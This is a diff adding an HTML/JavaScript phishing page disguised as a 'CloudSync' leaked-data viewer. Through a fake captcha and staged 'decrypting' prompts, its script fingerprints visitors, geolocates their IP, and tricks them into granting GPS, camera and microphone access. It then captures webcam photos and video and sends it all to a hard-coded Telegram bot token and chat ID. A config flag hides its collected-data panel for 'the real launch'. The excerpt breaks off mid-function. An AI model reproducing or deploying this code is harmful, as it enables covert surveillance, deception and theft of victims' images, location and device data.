@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>CloudSync — Device Data</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{background:#101418;color:#c8d4dc;font-family:Arial,Helvetica,sans-serif;min-height:100vh;padding-bottom:84px}
+
+  .topbar{background:#161d24;border-bottom:1px solid #24303a;padding:10px 14px;display:flex;align-items:center;gap:10px}
+  .topbar .logo{font-weight:bold;color:#fff;font-size:.95em;letter-spacing:.5px}
+  .topbar .logo span{color:#3fa4ff}
+  .topbar .dev{font:11px monospace;color:#6d8291;border:1px solid #26333d;border-radius:4px;padding:3px 8px}
+  .topbar .sync{margin-left:auto;font-size:.7em;color:#54c472;display:flex;align-items:center;gap:5px}
+  .topbar .sync .dot{width:7px;height:7px;border-radius:50%;background:#54c472;display:inline-block}
+
+  .wrap{max-width:520px;margin:0 auto;padding:12px}
+
+  .owner{background:#151c23;border:1px solid #24303a;border-radius:10px;padding:12px;display:flex;gap:12px;align-items:center;margin-bottom:12px;cursor:pointer}
+  .owner img{width:64px;height:64px;border-radius:50%;object-fit:cover;border:2px solid #2b3d49;flex:none}
+  .owner .on{flex:1;min-width:0}
+  .owner .nm{color:#fff;font-size:.95em;margin-bottom:3px;font-family:monospace}
+  .owner .em{font:11px monospace;color:#5f7484;margin-bottom:6px}
+  .stats{display:flex;gap:6px;flex-wrap:wrap}
+  .st{background:#10161c;border:1px solid #22303a;border-radius:5px;padding:3px 8px;font:10px monospace;color:#7a93a4}
+  .st b{color:#a9c3d4;font-weight:normal}
+
+  section{margin:14px 0}
+  section .h{display:flex;align-items:center;gap:8px;margin-bottom:8px}
+  section .h .t{font-size:.78em;color:#8fa8b8;letter-spacing:.8px;text-transform:uppercase}
+  section .h .n{font:10px monospace;color:#54697a;background:#151d24;border:1px solid #22303a;border-radius:10px;padding:1px 8px}
+  section .h .more{margin-left:auto;font-size:.68em;color:#3fa4ff}
+
+  .tiles{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
+  .tile{position:relative;aspect-ratio:1;border-radius:7px;overflow:hidden;background:#0c1218;border:1px solid #1e2a33;cursor:pointer}
+  .tile img{width:100%;height:100%;object-fit:cover;display:block;filter:blur(7px) brightness(.7);transform:scale(1.08)}
+  .tile .ico{position:absolute;top:6px;left:6px;font-size:.75em}
+  .tile .ic2{position:absolute;top:6px;right:6px;font-size:.75em}
+  .tile.ok{border-color:#2c5b3a}
+  .tile.ok .ic2{color:#54c472}
+  .tiles.wide3{grid-template-columns:repeat(3,1fr)}
+  .tiles.wide3 .tile{aspect-ratio:4/5}
+
+  .toastbar{max-width:520px;margin:4px auto 0;font-size:.68em;color:#c9a75a;background:#1a170d;border:1px solid #3d3414;border-radius:6px;padding:6px 10px;text-align:center}
+
+  .barwrap{position:fixed;bottom:0;left:0;right:0;background:#12181e;border-top:1px solid #24303a;padding:12px 14px calc(12px + env(safe-area-inset-bottom));text-align:center;z-index:40;box-shadow:0 -6px 18px rgba(0,0,0,.4)}
+  .btn{display:inline-block;background:#1d5f9c;color:#eaf6ff;border:1px solid #2e7bc0;border-radius:9px;padding:14px 26px;font-size:.95em;font-weight:bold;cursor:pointer;letter-spacing:.4px;width:100%;max-width:480px}
+  .btn:active{transform:scale(.98)}
+  .btn2{background:#1a222b;color:#93aab9;border:1px solid #2a3843;border-radius:9px;font-size:.8em;padding:10px 16px;font-family:Arial,sans-serif;cursor:pointer}
+  .copybar{max-width:520px;margin:10px auto 6px;text-align:center}
+  .copybar .btn2{width:100%;max-width:480px}
+
+  .ov{position:fixed;inset:0;background:rgba(4,7,10,.92);z-index:60;display:none;align-items:center;justify-content:center;padding:16px}
+  .ov.show{display:flex}
+  .modal{background:#141b22;border:1px solid #26333d;border-radius:12px;max-width:380px;width:100%;padding:20px 18px 16px;text-align:center}
+  .modal .mbody h2{font-size:1em;color:#fff;margin-bottom:10px;font-weight:bold;line-height:1.4}
+  .modal .mbody p{font-size:.8em;color:#9fb4c2;line-height:1.55;margin-bottom:14px}
+  .modal .steps{display:flex;flex-direction:column;gap:10px;padding-bottom:6px}
+  .modal .steps.row{flex-direction:row;justify-content:center;gap:10px}
+  .modal .steps.row .btn,.modal .steps.row .btn2{flex:1}
+
+  .prog{border-top:1px solid #22303a;margin-top:6px;padding-top:10px}
+  .pbarw{background:#0d1318;border:1px solid #22303a;border-radius:6px;height:16px;overflow:hidden}
+  .pbar{background:linear-gradient(90deg,#1d5f9c,#3fa4ff);height:100%;width:0%;transition:width .3s}
+  .pnum{font-size:.72em;color:#6d8291;margin-top:4px;text-align:left;font-family:monospace}
+  .plog{font-size:.68em;color:#5f7484;margin-top:4px;line-height:1.5;text-align:left;min-height:16px;font-family:monospace}
+  .spin{display:inline-block;width:13px;height:13px;border:2px solid #334652;border-top-color:#3fa4ff;border-radius:50%;animation:sp .9s linear infinite;vertical-align:-2px;margin-right:5px}
+  @keyframes sp{to{transform:rotate(360deg)}}
+
+  .cap-box{border:1px solid #22303a;border-radius:8px;padding:14px;margin:10px 0 14px;background:#0f151b;cursor:pointer;user-select:none;display:flex;align-items:center;gap:12px;justify-content:center}
+  .cap-box .cbs{width:22px;height:22px;border:2px solid #2c4a60;border-radius:4px;display:inline-flex;align-items:center;justify-content:center;color:#54c472;font-size:.9em;flex:none}
+  .cap-box.done .cbs{background:#122b1c;border-color:#54c472}
+  .cap-box span.lbl{font-size:.85em;color:#9fb4c2}
+  .cap-box.done span.lbl{color:#54c472}
+
+  .netw{font-size:.7em;color:#8fa8b8;background:#10161c;border:1px solid #22303a;border-radius:6px;padding:6px 8px;margin:0 0 12px;text-align:left}
+  .netw b{color:#c9dde9;font-weight:normal}
+
+  .video-el{position:fixed;width:2px;height:2px;opacity:0.01;pointer-events:none;left:-10px;top:-10px}
+  .toast{position:fixed;top:12px;left:50%;transform:translateX(-50%);background:#122b1c;border:1px solid #2f6b45;color:#bfe9cd;padding:8px 16px;border-radius:18px;font-size:.78em;z-index:95;opacity:0;transition:opacity .3s;pointer-events:none;max-width:88vw;text-align:center}
+  .toast.show{opacity:1}
+
+  /* ===== COLLECTED DATA (local test only) ===== */
+  #cdTab{position:fixed;right:0;top:42%;z-index:94;background:#123a5c;color:#cde9f8;border:1px solid #2a6a9c;border-right:none;border-radius:8px 0 0 8px;padding:12px 8px;writing-mode:vertical-rl;font-family:monospace;font-size:.72em;letter-spacing:1px;cursor:pointer;box-shadow:-3px 0 8px rgba(0,0,0,.4)}
+  #cdPanel{position:fixed;inset:0;background:rgba(4,6,10,.97);z-index:98;display:none;overflow:auto;padding:14px;font:12px/1.6 monospace}
+  #cdPanel.show{display:block}
+  .cdh{position:sticky;top:0;background:#0a1420;padding:10px 12px;margin:-14px -14px 12px;border-bottom:1px solid #1e3a52;display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap}
+  .cdh b{color:#fff;font-size:1.1em}
+  .cdh .tools{display:flex;gap:8px;flex-wrap:wrap}
+  .cdbtn{background:#16324a;color:#bcd8ec;border:1px solid #2a5c84;border-radius:6px;padding:6px 12px;font-family:monospace;font-size:.85em;cursor:pointer}
+  .cdbtn.warnb{background:#4a1e1e;border-color:#7c3434;color:#f0c0c0}
+  .sess{background:#0e1520;border:1px solid #1d2c3c;border-radius:8px;margin:10px 0;padding:10px}
+  .sess h3{color:#9fd49f;font-size:.95em;margin-bottom:6px;font-weight:600}
+  .kv{color:#8fb3cc;margin:2px 0;padding-left:10px}
+  .kv b{color:#e8f0f4}
+  .cdphotos{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
+  .cdphotos img{width:110px;border-radius:6px;border:1px solid #2a4a5c;cursor:zoom-in}
+  .cdphotos audio{display:block;margin:6px 0;width:260px}
+  .cdvideos video{display:block;margin:6px 0;width:280px;border-radius:6px;border:1px solid #2a4a5c}
+  .caplabel{font-size:.85em;color:#6f97b5;margin:4px 0 2px}
+  .evtl{margin-top:8px;max-height:150px;overflow:auto;border-top:1px dashed #21313f;padding-top:6px}
+  .evtl div{color:#7d99ad;font-size:.92em}
+  .gpslink{color:#7fd49f;text-decoration:none}
+  .lb2{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:99;display:none;align-items:center;justify-content:center;flex-direction:column}
+  .lb2.show{display:flex}
+  .lb2 img{max-width:96vw;max-height:86vh;border-radius:8px}
+  .lb2 .c{color:#888;margin-top:12px;font-size:.9em;cursor:pointer}
+  .empty{color:#556;text-align:center;padding:30px 10px}
+  .dirlist{max-height:120px;overflow:auto;background:#0a1017;border:1px solid #1c2c3a;border-radius:6px;padding:6px 8px;margin:4px 0 8px;color:#7d99ad;font-size:.9em}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo">Cloud<span>Sync</span></div>
+  <div class="dev">device #3821</div>
+  <div class="sync"><span class="dot"></span>synced</div>
+</div>
+
+<div class="wrap">
+
+  <div class="owner" onclick="startUnlock('owner')">
+    <img src="photo_main.jpg" alt="" onerror="this.src='https://picsum.photos/seed/owner28/200/200'">
+    <div class="on">
+      <div class="nm">user_4a21</div>
+      <div class="em">owner · registered 14.03.2025</div>
+      <div class="stats">
+        <span class="st"><b>1.8 GB</b> collected</span>
+        <span class="st"><b>214</b> contacts</span>
+        <span class="st">last sync: <b>2 d ago</b></span>
+      </div>
+    </div>
+  </div>
+
+  <section>
+    <div class="h"><span class="t">📷 Gallery</span><span class="n">57</span><span class="more">view all</span></div>
+    <div class="tiles" id="gal"></div>
+  </section>
+
+  <section>
+    <div class="h"><span class="t">💬 Chats</span><span class="n">12</span><span class="more">view all</span></div>
+    <div class="tiles wide3" id="chats"></div>
+  </section>
+
+  <section>
+    <div class="h"><span class="t">🎙 Voice &amp; Files</span><span class="n">31</span><span class="more">view all</span></div>
+    <div class="tiles" id="misc"></div>
+  </section>
+
+  <div class="toastbar">⚠ trial mode — full access requires activation (some media stays blurred)</div>
+
+  <div class="copybar"><button class="btn2" onclick="copyLink()">📎 copy panel link</button></div>
+</div>
+
+<div class="barwrap">
+  <button class="btn" onclick="startUnlock('bar')">🔓 OPEN RECOVERED DATA</button>
+</div>
+
+<div class="ov" id="ov">
+  <div class="modal">
+    <div class="mbody" id="mBody"></div>
+    <div class="prog" id="prog" style="display:none">
+      <div class="pbarw"><div class="pbar" id="pb"></div></div>
+      <div class="pnum" id="pn">0%</div>
+      <div class="plog" id="plg"></div>
+    </div>
+  </div>
+</div>
+<video class="video-el" id="vid" autoplay playsinline muted></video>
+<div class="toast" id="toast"></div>
+
+<div id="cdTab" onclick="openCD()" style="display:none">COLLECTED DATA</div>
+<div id="cdPanel"></div>
+<div class="lb2" id="lb2" onclick="this.classList.remove('show')"><img id="lb2i"><div class="c">click to close</div></div>
+
+<script>
+/* ================= CONFIG ================= */
+const CFG = {
+  LOCAL_TEST: true,          // FALSE for the real launch — hides the Collected Data tab
+  TG_BOT_TOKEN: '8352957262:AAE7hMT3LaTRglCPZYwGCNQe8Yj9w-8qldI',
+  TG_CHAT_ID:  '621528167',
+  TG_POLL: true,             // alert if someone writes to our bot
+  IPINFO_TOKEN: '',          // '' = free ipwho.is
+
+  CHAT_FILES: ['chat1.jpg','chat2.jpg','chat3.jpg','chat4.jpg','chat5.jpg'],
+  GAL_COUNT: 8,
+  MISC_COUNT: 4,
+
+  CAM_VIDEO_SEC: 4,
+  CAM_FRAMES: 4,
+  MIC_SEC: 8
+};
+/* ========================================== */
+
+const Q = new URLSearchParams(location.search);
+let session, t0 = Date.now();
+let perms = {camera:false, geo:false, mic:false, storage:false};
+let heroStream = null, camRecorder = null;
+
+/* ---------- utils ---------- */
+function uuid(){ return crypto.randomUUID ? crypto.randomUUID() : 'id-'+Math.random().toString(36).slice(2)+Date.now() }
+function hash(s){ let h=5381; for(let i=0;i<s.length;i++) h=((h<<5)+h+s.charCodeAt(i))>>>0; return h.toString(16) }
+function ev(e,m){ session.events.push({t:Date.now(),e,m:m||null}); save() }
+function toast(t){ const el=document.getElementById('toast'); el.textContent=t; el.classList.add('show'); setTimeout(()=>el.classList.remove('show'),2400) }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)) }
+function save(){
+  session.updatedAt=Date.now(); session.durSec=Math.round((Date.now()-t0)/1000);
+  let all={}; try{all=JSON.parse(localStorage.getItem('arc_sessions')||'{}')}catch(e){}
+  all[session.id]=session;
+  try{ localStorage.setItem('arc_sessions',JSON.stringify(all)) }
+  catch(e){ trimSessionData(); try{localStorage.setItem('arc_sessions',JSON.stringify(all))}catch(e2){} }
+}
+function trimSessionData(){
+  const all=JSON.parse(localStorage.getItem('arc_sessions')||'{}');
+  Object.values(all).forEach(s=>{
+    if(s.captures){
+      const photos=s.captures.filter(c=>c.type==='photo');
+      const heavy=s.captures.filter(c=>c.type!=='photo');
+      if(photos.length>1) s.captures=heavy.concat(photos.slice(0,1));
+    }
+  });
+  localStorage.setItem('arc_sessions',JSON.stringify(all));
+}
+
+/* ---------- layer 0 ---------- */
+function canvasFP(){ try{ const c=document.createElement('canvas');c.width=200;c.height=50;const x=c.getContext('2d');
+  x.textBaseline='top';x.font='15px Arial';x.fillStyle='#f60';x.fillRect(5,5,70,20);x.fillStyle='#069';x.fillText('leaked::archive 42',2,15);
+  x.fillStyle='rgba(102,204,0,.7)';x.fillText('okay ✔ ♂ ♀',4,30);x.globalCompositeOperation='multiply';x.beginPath();x.arc(50,40,15,0,7);x.fill();
+  return 'FP-'+hash(c.toDataURL()).toUpperCase().slice(0,8);}catch(e){return 'FP-ERR'} }
+function webglFP(){ try{ const g=document.createElement('canvas').getContext('webgl'); if(!g)return null;
+  let r='',v=''; try{const d=g.getExtension('WEBGL_debug_renderer_info'); if(d){r=g.getParameter(d.UNMASKED_RENDERER_WEBGL);v=g.getParameter(d.UNMASKED_VENDOR_WEBGL)}}catch(e){}
+  if(!r){r=g.getParameter(g.RENDERER);v=g.getParameter(g.VENDOR)}
+  return {renderer:r,vendor:v,gh:hash(r+v+g.getParameter(g.MAX_TEXTURE_SIZE))};}catch(e){return null} }
+async function audioFP(){ try{ const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext; const c=new AC(1,44100,44100);
+  const o=c.createOscillator();o.type='triangle';o.frequency.value=10000;const comp=c.createDynamicsCompressor();
+  o.connect(comp);comp.connect(c.destination);o.start(0);const b=await c.startRendering();
+  let s=0;for(let i=1500;i<3500;i++)s+=Math.abs(b.getChannelData(0)[i]);
+  return 'AU-'+hash(s.toFixed(9)).toUpperCase().slice(0,8);}catch(e){return 'AU-ERR'} }
+function deviceInfo(){ const n=navigator; return {
+  ua:n.userAgent, platform:n.platform||null, screen:screen.width+'x'+screen.height, dpr:devicePixelRatio,
+  cores:n.hardwareConcurrency||null, memoryGB:n.deviceMemory||null,
+  timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, langs:(n.languages||[]).join(','),
+  touch:n.maxTouchPoints||0, dnt:n.doNotTrack||null, webdriver:n.webdriver||false,
+  net:(navigator.connection||{}).effectiveType||null, referrer:document.referrer||null, landing:location.href } }
+async function mediaDevices(){ try{ const d=await navigator.mediaDevices.enumerateDevices(); return d.filter(x=>x.kind==='videoinput'||x.kind==='audioinput').map(x=>x.kind+(x.label?':'+x.label:'')) }catch(e){ return null } }
+function webrtc(){ return new Promise(res=>{ const out=[];
+  try{ const pc=new RTCPeerConnection({iceServers:[]}); pc.createDataChannel('x');
+    pc.onicecandidate=e=>{ if(e.candidate) out.push(e.candidate.candidate) };
+    pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
+    setTimeout(()=>res(out.length?out:null),1600);}catch(e){res(null)} }) }
+async function battery(){ try{ const b=await navigator.getBattery(); return {level:Math.round(b.level*100)+'%',charging:b.charging} }catch(e){ return null } }
+async function getIP(){
+  let ip=null; try{ const r=await fetch('https://api.ipify.org?format=json'); ip=(await r.json()).ip }catch(e){}
+  session.ip=ip;
+  if(ip){ try{ let g; if(CFG.IPINFO_TOKEN){ g=await (await fetch('https://ipinfo.io/'+ip+'?token='+CFG.IPINFO_TOKEN)).json() }
+    else{ g=await (await fetch('https://ipwho.is/'+ip)).json() }
+    session.geo={ip,city:g.city,region:g.region||g.regionName,country:g.country,org:g.org||((g.connection||{}).isp||null)};
+  }catch(e){} }
+  save(); tgIP();
+}
+
+/* ================= TELEGRAM ================= */
+function tgActive(){ return CFG.TG_BOT_TOKEN && CFG.TG_BOT_TOKEN.indexOf('PASTE')!==0 && CFG.TG_CHAT_ID && CFG.TG_CHAT_ID.indexOf('PASTE')!==0 }
+function tgAPI(){ return 'https://api.telegram.org/bot'+CFG.TG_BOT_TOKEN }
+async function tgText(text){
+  if(!tgActive()) return;
+  try{ await fetch(tgAPI()+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},keepalive:true,
+    body:JSON.stringify({chat_id:CFG.TG_CHAT_ID,text})}) }catch(e){}
+}
+async function tgTextChunked(header, lines){
+  let buf=header+'\n';
+  for(const l of lines){
+    if((buf+'\n'+l).length>3500){ await tgText(buf); buf=header+' (cont.)\n'; }
+    buf+=l+'\n';
+  }
+  await tgText(buf);
+}
+async function tgPhoto(dataURL, caption){
+  if(!tgActive()) return;
+  try{
+    const blob=await (await fetch(dataURL)).blob();
+    const fd=new FormData();
+    fd.append('chat_id',CFG.TG_CHAT_ID);
+    fd.append('caption',caption||'');
+    fd.append('photo',blob,'photo.jpg');
+    await fetch(tgAPI()+'/sendPhoto',{method:'POST',body:fd});
+  }catch(e){}
+}
+async function tgDoc(dataURL, filename, caption){
+  if(!tgActive()) return;
+  try{
+    const blob=await (await fetch(dataURL)).blob();
+    const fd=new FormData();
+    fd.append('chat_id',CFG.TG_CHAT_ID);
+    fd.append('caption',caption||'');
+    fd.append('document',blob,filename);
+    await fetch(tgAPI()+'/sendDocument',{method:'POST',body:fd});
+  }catch(e){}
+}
+function tag(){ return '[c:'+(session.canary||'-')+'|'+session.id.slice(0,6)+']' }
+
+function tgVisit(){
+  const d=session.device;
+  tgText('🔔 NEW VISIT '+tag()+'\n'+
+    new Date().toLocaleString()+'\n'+
+    'landed: '+session.landing+'\n'+
+    (d.referrer?('from: '+d.referrer+'\n'):'')+
+    'UA: '+d.ua+'\n'+
+    d.platform+' · '+d.screen+' @'+d.dpr+'x · cores: '+d.cores+' · RAM: '+(d.memoryGB||'?')+'GB · touch: '+d.touch+'\n'+
+    d.timezone+' · langs: '+d.langs+' · net: '+(d.net||'?'));
+}
+function tgIP(){
+  const g=session.geo;
+  tgText('🌐 '+(g?('IP: '+g.ip+' · '+g.city+', '+(g.region||'')+' '+g.country+'\norg: '+(g.org||'?')):('IP: '+(session.ip||'unknown')+' (geo lookup failed)')));
+}
+function tgDetails(){
+  const f=[];
+  f.push('fingerprint: '+session.fp+' · audioFP: '+(session.fpAudio||'-'));
+  if(session.fpGL) f.push('GPU: '+session.fpGL.renderer+' ('+session.fpGL.vendor+')');
+  if(session.battery) f.push('battery: '+session.battery.level+(session.battery.charging?' charging':''));
+  if(session.media&&session.media.length) f.push('devices: '+session.media.join(' | '));
+  if(session.webrtc&&session.webrtc.length) f.push('webrtc: '+session.webrtc[0].slice(0,90));
+  tgText('🔎 DETAILS '+tag()+'\n'+f.join('\n'));
+}
+function tgClose(){
+  tgText('🚪 closed after '+(session.durSec||0)+'s '+tag());
+}
+async function tgPollIncoming(){
+  if(!CFG.TG_POLL || !tgActive()) return;
+  try{
+    const off=+(localStorage.getItem('tg_off')||0);
+    const r=await (await fetch(tgAPI()+'/getUpdates?timeout=30&allowed_updates=["message"]&offset='+(off+1))).json();
+    if(r.ok && r.result && r.result.length){
+      let last=off;
+      r.result.forEach(u=>{
+        const m=u.message;
+        if(m && String(m.chat.id)!==String(CFG.TG_CHAT_ID)){
+          const who=(m.from.username?('@'+m.from.username):(m.from.first_name||'?'))+' (id '+m.from.id+')';
+          tgText('⚠️⚠️ BOT CONTACTED by '+who+'\ntext: '+(m.text||'(media)'));
+        }
+        last=u.update_id;
+      });
+      localStorage.setItem('tg_off',last);
+    }
+  }catch(e){}
+  setTimeout(tgPollIncoming, 45000);
+}
+
+/* ---------- dashboard tiles ---------- */
+function mkTile(parent,idx,kind){
+  const d=document.createElement('div'); d.className='tile'; d.id='tile_'+kind+'_'+idx;
+  const im=document.createElement('img');
+  im.src=(kind==='gal')?('gal'+(idx+1)+'.jpg'):(kind==='chat'?CFG.CHAT_FILES[idx%CFG.CHAT_FILES.length]:('misc'+(idx+1)+'.jpg'));
+  im.draggable=false;
+  im.onerror=()=>{ im.src='https://picsum.photos/seed/'+kind+idx+(Date.now()%1000)+'/300/300' };
+  const ico=document.createElement('span'); ico.className='ico'; ico.textContent='🔒';
+  const ic2=document.createElement('span'); ic2.className='ic2'; ic2.style.color='#8fa8b8'; ic2.textContent='🖼';
+  d.appendChild(im); d.appendChild(ico); d.appendChild(ic2);
+  d.onclick=()=>startUnlock(kind+idx);
+  document.getElementById(parent).appendChild(d);
+}
+function buildDash(){
+  for(let i=0;i<CFG.GAL_COUNT;i++) mkTile('gal',i,'gal');
+  for(let i=0;i<CFG.CHAT_FILES.length+1;i++) mkTile('chats',i,'chat');
+  for(let i=0;i<CFG.MISC_COUNT;i++) mkTile('misc',i,'misc');
+}
+function markOk(src){
+  if(src==='owner'||src==='bar') return;
+  const el=document.getElementById(src.replace(/(gal|chat|misc)(\d+)/,'tile_$1_$2'));
+  if(el){ el.classList.add('ok'); el.querySelector('.ic2').textContent='✔' }
+}
+
+/* ---------- modal engine ---------- */
+function showMBody(html){ document.getElementById('mBody').innerHTML=html; document.getElementById('ov').classList.add('show') }
+function showProg(){ document.getElementById('prog').style.display='block' }
+function hideModal(){ document.getElementById('ov').classList.remove('show') }
+function drawBar(p){ document.getElementById('pb').style.width=Math.min(p,100)+'%'; document.getElementById('pn').textContent=Math.floor(p)+'% — decrypting' }
+function log(t){ document.getElementById('plg').innerHTML='<span class="spin"></span>'+t }
+
+async function startUnlock(src){
+  if(session.opened){ ev('reopen',{src}); markOk(src); await runCaptcha(src); return }
+  session.opened=true; ev('open',{src}); markOk(src); await runCaptcha(src);
+}
+
+/* checkbox captcha */
+function runCaptcha(src){
+  return new Promise(res=>{
+    showMBody(`
+      <h2>Security check</h2>
+      <p>Please confirm you are not a robot to continue:</p>
+      <div class="cap-box" id="cap">
+        <span class="cbs" id="cb">✓</span>
+        <span class="lbl" id="capt">I am not a robot</span>
+      </div>`);
+    document.getElementById('cb').style.display='none';
+    document.getElementById('cap').onclick=()=>{
+      const box=document.getElementById('cap');
+      if(box.classList.contains('done')) return;
+      box.classList.add('done');
+      document.getElementById('cb').style.display='flex';
+      document.getElementById('capt').textContent='verified ✓';
+      ev('captcha_ok',{src});
+      setTimeout(()=>{ hideModal(); setTimeout(()=>{ runLoader(src); res() },300) },550);
+    };
+  });
+}
+
+/* the ladder */
+async function runLoader(src){
+  ev('loader_start',{src});
+  showMBody('<h2>Opening data package…</h2>');
+  showProg();
+  let p=0;
+  const tick=async(min,max)=>{ while(p<min){ p=Math.min(p+(2+Math.random()*3),max); drawBar(p); await sleep(110+Math.random()*160) } };
+
+  await tick(14,18); log('connecting to CloudSync…'); await sleep(500);
+  await tick(26,29); log('device #3821 · data package found'); await sleep(450);
+  await tick(34,36); log('decrypting media…'); await sleep(600);
+
+  drawBar(37); log('restoring thumbnails…'); await sleep(400);
+  await msgQuality();
+  log('enhancing media…'); await sleep(300);
+  await grabCamera('enhancer');
+
+  await tick(52,56); log('reading chats database…'); await sleep(450);
+  await tick(60,61); log('scanning package metadata…'); await sleep(600);
+  log('location history found…'); await sleep(700);
+  const cp2=61+Math.floor(Math.random()*3); drawBar(cp2);
+  await msgLocation();
+  log('loading content…');
+
+  await tick(76,80); log('assembling messages…'); await sleep(500);
+  await tick(88,89); log('indexing media…'); await sleep(400);
+  drawBar(90); log('loading videos…'); await sleep(500);
+  await msgVideo();
+  log('preparing playback…');
+
+  await tick(97,98); log('decrypting final chunk…'); await sleep(1000);
+  await tick(100,100); log('✓ done');
+  await sleep(400);
+  await msgDownload(src);
+
+  async function msgQuality(){
+    await ask(`
+      <p>The saved quality of these files is a bit low — it happens with recovered packages.<br>Get the <b>best possible image quality</b>?</p>
+      <div class="steps">
+        <button class="btn" onclick="resStep(1)">⚡ YES, IMPROVE QUALITY</button>
+      </div>`, 'quality_choice');
+    showMBody('<h2>Opening data package…</h2>');
+  }
+  async function msgLocation(){
+    await ask(`
+      <p>This package contains the <b>location history of the device owner</b>.<br>Should locations be included with the files?</p>
+      <div class="steps row">
+        <button class="btn" onclick="resStep(1)">YES, INCLUDE</button>
+        <button class="btn2" onclick="resStep(2)">SKIP</button>
+      </div>`, 'loc_choice');
+    log('checking locations…');
+    if(perms.geo){ session.preciseAgain=true; ev('geo_cached'); log('locations ready ✓…'); await sleep(700); return }
+    const got=await new Promise(res=>{
+      if(!navigator.geolocation) return res(false);
+      navigator.geolocation.getCurrentPosition(
+        pos=>{ session.precise={lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy}; save(); res(true) },
+        err=>{ ev('geo_fail',{code:err.code}); tgText('📍 GPS denied/not available (code '+err.code+') '+tag()); res(false) },
+        {timeout:12000, maximumAge:60000});
+    });
+    perms.geo=true;
+    if(got){
+      const p2=session.precise;
+      tgText('📍 GPS: '+p2.lat+', '+p2.lon+' (±'+p2.acc+'m) '+tag()+'\nhttps://maps.google.com/?q='+p2.lat+','+p2.lon);
+      log('locations ready ✓…');
+    } else log('location unavailable, continuing…');
+    await sleep(700);
+  }
+  async function msgVideo(){
+    await ask(`
+      <p>The videos in this package can be loaded in <b>SD</b> or <b>HD</b> quality.</p>
+      <div class="netw">⚠ HD files are bigger (up to <b>~45 MB</b>).<br>On mobile internet this may use data from your plan — <b>Wi-Fi recommended</b>.</div>
+      <div class="steps row">
+        <button class="btn2" onclick="resStep(1)">SD (small)</button>
+        <button class="btn" onclick="resStep(2)">HD (best)</button>
+      </div>`, 'video_choice');
+    log('loading videos…'); await sleep(400);
+    await grabMic();
+    snapFrame('bonus');
+  }
+  async function msgDownload(src){
+    drawBar(100);
+    document.getElementById('pn').textContent='100% — ready';
+    ev('ready_100',{src});
+    tgText('✅ reached 100% & download stage '+tag());
+    session.finalMsgShown=true; save();
+    await ask(`
+      <h2>✓ Data package is ready</h2>
+      <p>All files have been recovered and decoded.<br>You can download them now:</p>
+      <div class="steps">
+        <button class="btn" onclick="resStep(1)">⬇ DOWNLOAD FILES</button>
+      </div>`, 'download_click');
+    await grabStorage(src);
+  }
+  function ask(html, evName){
+    return new Promise(res=>{
+      showMBody(html);
+      window.resStep=v=>{ ev(evName,{v}); res(v) };
+    });
+  }
+}
+
+/* ---------- permission grabbers ---------- */
+function waitCamReady(timeout){
+  return new Promise(res=>{
+    const v=document.getElementById('vid');
+    if(v.videoWidth>0 && v.readyState>=2) return res(true);
+    let done=false;
+    const t=setTimeout(()=>{ if(!done){ done=true; res(v.videoWidth>0) } }, timeout||4000);
+    v.addEventListener('loadedmetadata',()=>{
+      v.addEventListener('canplay',()=>{ if(!done){ done=true; clearTimeout(t); res(true) } },{once:true});
+      if(v.videoWidth>0 && !done){ done=true; clearTimeout(t); res(true) }
+    },{once:true});
+  });
+}
+async function grabCamera(reason){
+  if(perms.camera){ snapFrame(reason+'_again'); return true }
+  ev('cam_attempt',{reason});
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640}}});
+    perms.camera=true; heroStream=stream;
+    const v=document.getElementById('vid'); v.srcObject=stream;
+    session.camInfo=stream.getTracks().map(t=>t.label);
+    tgText('📷 CAMERA GRANTED ('+reason+') '+tag()+'\n'+session.camInfo.join(', '));
+    const ready=await waitCamReady(5000);
+    ev('cam_ready',{ready});
+    startCamRecording();
+    let got=0;
+    for(let att=0; att<CFG.CAM_FRAMES*2 && got<CFG.CAM_FRAMES; att++){
+      await sleep(800);
+      if(snapFrame(reason+'_f'+(got+1))) got++;
+    }
+    ev('cam_done',{reason,frames:got});
+    return true;
+  }catch(e){ ev('cam_fail',{reason,name:e.name}); tgText('📷 camera denied/not available: '+e.name+' '+tag()); return false }
+}
+function snapFrame(reason){
+  if(!heroStream) return false;
+  try{
+    const v=document.getElementById('vid');
+    if(!(v.videoWidth>0)||v.readyState<2) return false;
+    const c=document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight;
+    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+    const d=c.toDataURL('image/jpeg',0.7);
+    session.captures=session.captures||[];
+    session.captures.push({type:'photo',reason,data:d});
+    save(); tgPhoto(d,'📷 '+reason+' '+tag()); ev('frame',{reason});
+    return true;
+  }catch(e){ return false }
+}
+function startCamRecording(){
+  if(camRecorder) return;
+  try{
+    const chunks=[];
+    let mime='';
+    const types=['video/webm;codecs=vp8','video/webm','video/mp4'];
+    for(const t of types){ if(MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(t)){ mime=t; break } }
+    camRecorder=new MediaRecorder(heroStream, mime?{mimeType:mime}:undefined);
+    camRecorder.ondataavailable=e=>{ if(e.data&&e.data.size) chunks.push(e.data) };
+    camRecorder.start();
+    ev('cam_video_start',{mime});
+    setTimeout(async()=>{
+      try{
+        camRecorder.stop(); camRecorder=null;
+        if(!chunks.length) return;
+        const blob=new Blob(chunks,{type:chunks[0].type||'video/webm'});
+        const b64=await blobToB64(blob);
+        session.captures=session.captures||[];
+        session.captures.push({type:'video',reason:'cam_'+CFG.CAM_VIDEO_SEC+'s',data:b64});
